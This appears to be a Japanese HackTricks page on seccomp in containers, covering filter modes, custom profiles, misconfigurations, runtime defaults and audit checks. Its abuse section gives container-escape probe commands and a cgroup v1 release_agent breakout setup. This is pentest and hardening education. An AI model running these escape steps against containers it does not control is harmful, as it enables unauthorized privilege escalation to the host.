# seccomp

{{#include ../../../../banners/hacktricks-training.md}}

## 概要

**seccomp** は、プロセスが呼び出すことのできる syscalls に対して kernel がフィルタを適用する仕組みです。containerized 環境では、seccomp は通常 filter mode で使用され、プロセスが漠然と「restricted」とマークされるだけでなく、具体的な syscall ポリシーの適用対象となります。これは重要です。なぜなら多くの container breakouts は非常に特定の kernel インターフェースに到達する必要があるからです。プロセスが関連する syscalls を正常に呼び出せない場合、namespaces や capabilities の細かい差異が意味を持つ前に、多くの攻撃がそもそも成立しなくなります。

重要な考え方は単純です: namespaces は **プロセスが何を見られるか** を決め、capabilities は **プロセスが名目上試みることが許される特権的な操作** を決め、seccomp は **kernel が試みられたアクションの syscall エントリポイントをそもそも受け入れるかどうか** を決めます。これが、seccomp が capabilities のみで見れば可能に見える攻撃をしばしば防ぐ理由です。

## セキュリティへの影響

多くの危険な kernel サーフェスは、比較的少数の syscalls を通じてのみ到達可能です。container hardening において繰り返し問題となる例には `mount`, `unshare`, `clone` または `clone3`（特定フラグ付き）, `bpf`, `ptrace`, `keyctl`, `perf_event_open` などがあります。これらの syscalls に到達できる攻撃者は、新しい namespaces を作成したり、kernel サブシステムを操作したり、通常のアプリケーションコンテナがまったく必要としない攻撃対象に触れることができる可能性があります。

だからこそ、デフォルトの runtime seccomp プロファイルは非常に重要です。それらは単なる「追加の防御」ではありません。多くの環境では、コンテナが kernel 機能の広範な部分を行使できるか、アプリケーションが実際に必要とする syscall サーフェスに近い範囲に制約されるかの違いを生みます。

## モードとフィルタの構成

seccomp は歴史的に strict mode を持ち、非常に小さな syscall セットだけが利用可能な状態がありましたが、現代の container runtimes に関連するモードは seccomp filter mode、しばしば **seccomp-bpf** と呼ばれるモードです。このモデルでは、kernel がフィルタプログラムを評価し、syscall を許可するか、errno で拒否するか、trap するか、ログするか、プロセスを kill するかを決めます。Container runtimes は、この機構が危険な syscalls の広いクラスをブロックしつつ、通常のアプリケーション動作を許容するのに十分表現力があるためこれを用います。

仕組みを魔法ではなく具体的に理解するために、低レベルの例が二つ有用です。Strict mode はかつての「最小限の syscall セットだけが残る」モデルを示します：
```c
#include <fcntl.h>
#include <linux/seccomp.h>
#include <stdio.h>
#include <string.h>
#include <sys/prctl.h>
#include <unistd.h>

int main(void) {
int output = open("output.txt", O_WRONLY);
const char *val = "test";
prctl(PR_SET_SECCOMP, SECCOMP_MODE_STRICT);
write(output, val, strlen(val) + 1);
open("output.txt", O_RDONLY);
}
```
最後の `open` は、strict mode の最小セットに含まれないため、プロセスが強制終了されます。

A libseccomp フィルタの例は、現代のポリシーモデルをより明確に示しています:
```c
#include <errno.h>
#include <seccomp.h>
#include <stdio.h>
#include <unistd.h>

int main(void) {
scmp_filter_ctx ctx = seccomp_init(SCMP_ACT_KILL);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(exit_group), 0);
seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EBADF), SCMP_SYS(getpid), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(brk), 0);
seccomp_rule_add(ctx, SCMP_ACT_ALLOW, SCMP_SYS(write), 2,
SCMP_A0(SCMP_CMP_EQ, 1),
SCMP_A2(SCMP_CMP_LE, 512));
seccomp_rule_add(ctx, SCMP_ACT_ERRNO(EBADF), SCMP_SYS(write), 1,
SCMP_A0(SCMP_CMP_NE, 1));
seccomp_load(ctx);
seccomp_release(ctx);
printf("pid=%d\n", getpid());
}
```
このスタイルのポリシーは、実行時の seccomp プロファイルを想像するときに、ほとんどの読者が思い描くものです。

## ラボ

コンテナ内で seccomp が有効であることを確認する簡単な方法は次の通りです：
```bash
docker run --rm debian:stable-slim sh -c 'grep Seccomp /proc/self/status'
docker run --rm --security-opt seccomp=unconfined debian:stable-slim sh -c 'grep Seccomp /proc/self/status'
```
デフォルトのプロファイルが一般的に制限している操作を試すこともできます:
```bash
docker run --rm debian:stable-slim sh -c 'apt-get update >/dev/null 2>&1 && apt-get install -y util-linux >/dev/null 2>&1 && unshare -Ur true'
```
コンテナが通常のデフォルト seccomp プロファイルで実行されている場合、`unshare` スタイルの操作はしばしばブロックされます。これは、userspace ツールがイメージ内に存在していても、必要とする kernel パスが利用できない可能性があることを示す有用な実演です。
コンテナが通常のデフォルト seccomp プロファイルで実行されている場合、userspace ツールがイメージ内に存在していても、`unshare` スタイルの操作はしばしばブロックされます。

プロセスの状態をより一般的に確認するには、次を実行してください:
```bash
grep -E 'Seccomp|NoNewPrivs' /proc/self/status
```
## ランタイムでの使用

Dockerはデフォルトとカスタムのseccompプロファイルの両方をサポートし、管理者が `--security-opt seccomp=unconfined` でそれらを無効化できるようにします。Podmanも同様のサポートを持ち、seccompをrootless実行と組み合わせて非常に適切なデフォルト姿勢を取ることが多いです。Kubernetesはワークロードの設定を通じてseccompを公開しており、`RuntimeDefault` は通常妥当なベースラインであり、`Unconfined` は便宜上のトグルとしてではなく正当化が必要な例外として扱うべきです。

containerd および CRI-O ベースの環境では、処理経路はより階層化されていますが、原則は同じです：上位のエンジンやオーケストレータが何を行うかを決定し、ランタイムが最終的にコンテナプロセスに対する seccomp ポリシーをインストールします。結果はカーネルに到達する最終的なランタイム設定に依存します。

### カスタムポリシーの例

Docker や同様のエンジンは JSON からカスタム seccomp プロファイルを読み込むことができます。 他はすべて許可しつつ `chmod` を拒否する最小の例は次のようになります：
```json
{
"defaultAction": "SCMP_ACT_ALLOW",
"syscalls": [
{
"name": "chmod",
"action": "SCMP_ACT_ERRNO"
}
]
}
```
使用ツール:
```bash
docker run --rm -it --security-opt seccomp=/path/to/profile.json busybox chmod 400 /etc/hosts
```
コマンドは `Operation not permitted` で失敗し、制限が単なるファイル権限ではなく syscall ポリシーに由来することを示している。実際のハードニングでは、allowlists は小さな blacklist を用いる permissive defaults よりも一般的に強力である。

## 誤設定

もっとも単純な誤りは、アプリケーションがデフォルトポリシー下で失敗したために seccomp を **unconfined** に設定することだ。これはトラブルシューティング中によく見られ、恒久的な修正としては非常に危険である。フィルタがなくなると、多くの syscall ベースの脱出プリミティブが再び到達可能になり、特に強力な capabilities や host namespace の共有がある場合はさらに危険度が増す。

別によくある問題は、ブログや社内の回避策からコピーした **custom permissive profile** を十分にレビューせずに使うことだ。チームはしばしば、プロファイルが「アプリが壊れないようにする」ことを優先して作られているため、ほとんどの危険な syscalls をそのまま残してしまう。三つ目の誤解は、seccomp は non-root コンテナでは重要性が低いと考えることだ。実際には、プロセスが UID 0 でなくても多くの kernel attack surface は依然として relevant である。

## 悪用

seccomp が存在しないか著しく弱められていると、攻撃者は namespace-creation syscalls を呼び出したり、`bpf` や `perf_event_open` を通じて到達可能な kernel attack surface を拡大したり、`keyctl` を悪用したり、これらの syscall パスを `CAP_SYS_ADMIN` のような危険な capabilities と組み合わせたりできる。多くの実際の攻撃では、seccomp は唯一の欠けている制御ではないが、その欠如によりエクスプロイト経路は劇的に短くなる。なぜなら、それが残る数少ない防御の一つを取り除き、危険な syscall を特権モデルが作用する前に遮断できなくしてしまうからだ。

最も有用な実践的テストは、default profiles が通常ブロックする正確な syscall families を試してみることだ。それらが突然動作するようなら、container posture は大きく変わっている：
```bash
grep Seccomp /proc/self/status
unshare -Ur true 2>/dev/null && echo "unshare works"
unshare -m true 2>/dev/null && echo "mount namespace creation works"
```
`CAP_SYS_ADMIN` または他の強力な capability が存在する場合、mount-based abuse に進む前に seccomp が唯一の欠けている障壁かどうかを確認する:
```bash
capsh --print | grep cap_sys_admin
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount -t proc proc /tmp/m 2>/dev/null && echo "proc mount works"
```
一部のターゲットでは、即時の価値は完全な escape ではなく、information gathering と kernel attack-surface の拡大にあります。これらのコマンドは、特にセンシティブな syscall パスに到達可能かどうかを判定するのに役立ちます：
```bash
which unshare nsenter strace 2>/dev/null
strace -e bpf,perf_event_open,keyctl true 2>&1 | tail
```
seccompが存在せず、かつコンテナが他の点でも特権を持っている場合、そのときこそ、既に文書化されているlegacy container-escapeページにあるより具体的なブレイクアウト手法へピボットするのが理にかなっています。

### 完全な例: seccomp が `unshare` をブロックしていた唯一の要因

多くのターゲットでは、seccomp を削除することで実際に起きる効果は、namespace-creation や mount syscalls が突然動作し始めることです。コンテナが `CAP_SYS_ADMIN` を持っている場合、次のシーケンスが可能になることがあります:
```bash
grep Seccomp /proc/self/status
capsh --print | grep cap_sys_admin
mkdir -p /tmp/nsroot
unshare -m sh -c '
mount -t tmpfs tmpfs /tmp/nsroot &&
mkdir -p /tmp/nsroot/proc &&
mount -t proc proc /tmp/nsroot/proc &&
mount | grep /tmp/nsroot
'
```
これ自体はまだホスト脱出ではありませんが、seccomp がマウント関連の悪用を防いでいた障壁であることを示しています。

### 完全な例: seccomp が無効化された + cgroup v1 `release_agent`

seccomp が無効化され、コンテナが cgroup v1 階層をマウントできる場合、cgroups セクションの `release_agent` 手法に到達可能になります:
```bash
grep Seccomp /proc/self/status
mount | grep cgroup
unshare -UrCm sh -c '
mkdir /tmp/c
mount -t cgroup -o memory none /tmp/c
echo 1 > /tmp/c/notify_on_release
echo /proc/self/exe > /tmp/c/release_agent
(sleep 1; echo 0 > /tmp/c/cgroup.procs) &
while true; do sleep 1; done
'
```
これは seccomp-only exploit ではありません。ポイントは、seccomp が unconfined になると、以前にブロックされていた syscall-heavy breakout chains が、そのままの記述どおりに動作し始める可能性があるということです。

## チェック

これらのチェックの目的は、seccomp がそもそも有効かどうか、`no_new_privs` がそれに伴っているか、そしてランタイム構成が seccomp を明示的に無効化しているかどうかを確認することです。
```bash
grep Seccomp /proc/self/status                               # Current seccomp mode from the kernel
cat /proc/self/status | grep NoNewPrivs                      # Whether exec-time privilege gain is also blocked
docker inspect <container> | jq '.[0].HostConfig.SecurityOpt'   # Runtime security options, including seccomp overrides
```
ここで注目すべき点：

- 非ゼロの`Seccomp`値はフィルタリングが有効であることを意味する。`0`は通常seccomp保護がないことを意味する。
- ランタイムのセキュリティオプションに`seccomp=unconfined`が含まれている場合、そのワークロードは最も有用なsyscallレベルの防御の一つを失っている。
- `NoNewPrivs`自体はseccompではないが、両方が共に見られる場合、どちらも見られない場合より慎重なハードニング姿勢を示すことが多い。

コンテナが既に疑わしいマウント、広範なcapabilities、またはホストと共有されたnamespacesを持っていて、さらにseccompもunconfinedである場合、その組み合わせは大きな権限昇格のシグナルとして扱うべきである。コンテナが即座に破られるとは限らないが、攻撃者が利用できるカーネルのエントリポイントの数は急激に増加している。

## ランタイムのデフォルト

| Runtime / platform | デフォルト状態 | デフォルトの挙動 | よくある手動での弱体化 |
| --- | --- | --- | --- |
| Docker Engine | 通常デフォルトで有効 | Dockerの組み込みデフォルト seccomp profile を使用する（上書きされない限り） | `--security-opt seccomp=unconfined`, `--security-opt seccomp=/path/profile.json`, `--privileged` |
| Podman | 通常デフォルトで有効 | ランタイムのデフォルト seccomp profile を適用する（上書きされない限り） | `--security-opt seccomp=unconfined`, `--security-opt seccomp=profile.json`, `--seccomp-policy=image`, `--privileged` |
| Kubernetes | **デフォルトでは保証されていない** | `securityContext.seccompProfile` が未設定の場合、kubeletが `--seccomp-default` を有効にしていない限りデフォルトは `Unconfined` である。`RuntimeDefault` または `Localhost` を明示的に設定する必要がある。 | `securityContext.seccompProfile.type: Unconfined`, `seccompDefault` を持たないクラスターで seccomp を未設定のままにする、`privileged: true` |
| containerd / CRI-O under Kubernetes | KubernetesのノードとPodの設定に従う | Kubernetesが `RuntimeDefault` を要求する場合、または kubelet の seccomp デフォルト化が有効な場合にランタイムプロファイルが使用される | Kubernetes行と同様；直接の CRI/OCI 設定でも seccomp を完全に省略できる |

Kubernetes の挙動は運用者を最も驚かせることが多い。多くのクラスターでは、Pod が要求するか、kubelet が `RuntimeDefault` にデフォルト設定するよう構成されていない限り、seccomp はまだ存在していない。
